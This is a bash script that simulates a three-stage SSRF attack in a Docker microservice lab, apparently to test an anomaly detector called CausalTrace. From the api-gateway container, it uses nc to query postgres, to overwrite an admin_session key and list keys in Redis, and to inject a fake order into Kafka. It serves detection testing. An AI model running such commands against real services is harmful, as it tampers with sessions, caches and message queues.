#!/bin/bash
# ssrf_attack.sh — Server-Side Request Forgery attack
#
# Attack scenario: An attacker exploits the api-gateway to make requests
# to internal services it should never directly access. In a microservice
# architecture, the api-gateway routes to product/order/payment/user services,
# but should NEVER talk directly to postgres, redis, or kafka.
#
# CausalTrace detects this via:
#   - Novel-edge: api-gateway → postgres:5432 (not calibrated)
#   - Novel-edge: api-gateway → redis:6379 (not calibrated)
#   - Sheaf anomaly: api-gateway behavior pattern changes
#
# Why Falco/Tetragon miss this:
#   - All connections are normal TCP connect() syscalls
#   - No privilege escalation, no file access, no exec anomaly
#   - Only the DESTINATION is wrong — requires graph-level analysis

LOG_DIR="${1:-results/run_latest/production_detection}"
mkdir -p "$LOG_DIR"

echo "============================================================"
echo "  SSRF Attack — 3 Stages"
echo "  $(date)"
echo "============================================================"

# ── STAGE 1: SSRF to internal Postgres ──────────────────────────
echo ""
echo "[STAGE 1] $(date +%s%N) — SSRF: api-gateway → postgres (direct DB access)"
echo "  Attacker sends crafted request to api-gateway that gets forwarded to postgres"
echo "  api-gateway should NEVER talk to postgres directly (product-service does)"

STAGE1_START=$(date +%s%N)
docker exec ct-prod-api-gw bash -c '
    # SSRF: api-gateway makes direct connection to postgres
    echo "SELECT * FROM pg_catalog.pg_tables;" | nc -w3 172.22.0.21 5432 2>/dev/null || true
    # Try to read postgres config
    curl -s http://172.22.0.21:5432/ 2>/dev/null || true
' > "$LOG_DIR/ssrf_stage1.log" 2>&1
STAGE1_END=$(date +%s%N)

echo "  Latency: $(( (STAGE1_END - STAGE1_START) / 1000000 )) ms"
echo "  Expected: Novel-edge (api-gw → postgres:5432 not calibrated)"

sleep 3

# ── STAGE 2: SSRF to internal Redis ─────────────────────────────
echo ""
echo "[STAGE 2] $(date +%s%N) — SSRF: api-gateway → redis (cache poisoning)"
echo "  Attacker exploits SSRF to write to Redis cache directly"

STAGE2_START=$(date +%s%N)
docker exec ct-prod-api-gw bash -c '
    # SSRF: direct Redis command injection
    printf "SET admin_session HACKED\r\nGET admin_session\r\n" | nc -w3 172.22.0.20 6379 2>/dev/null || true
    # Enumerate Redis keys
    printf "KEYS *\r\n" | nc -w3 172.22.0.20 6379 2>/dev/null || true
' > "$LOG_DIR/ssrf_stage2.log" 2>&1
STAGE2_END=$(date +%s%N)

echo "  Latency: $(( (STAGE2_END - STAGE2_START) / 1000000 )) ms"
echo "  Expected: Novel-edge (api-gw → redis:6379 not calibrated)"

sleep 3

# ── STAGE 3: SSRF to Kafka (message injection) ──────────────────
echo ""
echo "[STAGE 3] $(date +%s%N) — SSRF: api-gateway → kafka (message injection)"
echo "  Attacker injects malicious messages into Kafka via SSRF"

STAGE3_START=$(date +%s%N)
docker exec ct-prod-api-gw bash -c '
    # SSRF: direct Kafka connection (only inventory-service should talk to kafka)
    echo "MALICIOUS_ORDER_$(date +%s)" | nc -w3 172.22.0.23 9092 2>/dev/null || true
' > "$LOG_DIR/ssrf_stage3.log" 2>&1
STAGE3_END=$(date +%s%N)

echo "  Latency: $(( (STAGE3_END - STAGE3_START) / 1000000 )) ms"
echo "  Expected: Novel-edge (api-gw → kafka:9092 not calibrated)"

echo ""
echo "============================================================"
echo "  SSRF ATTACK COMPLETE — $(date)"
echo "============================================================"
echo ""
echo "Summary:"
echo "  Stages: 3 (postgres, redis, kafka)"
echo "  Attack class: SSRF / Trust boundary violation"
echo "  MITRE ATT&CK: T1090 (Proxy), T1071 (Application Layer Protocol)"
echo "  Novel edges: api-gw→postgres:5432, api-gw→redis:6379, api-gw→kafka:9092"
echo "  None of these edges were seen during calibration"
echo ""
echo "Why traditional tools miss this:"
echo "  - Every syscall is a normal connect() + send()"
echo "  - No file access, no exec, no privilege change"
echo "  - Only graph topology reveals the anomaly"
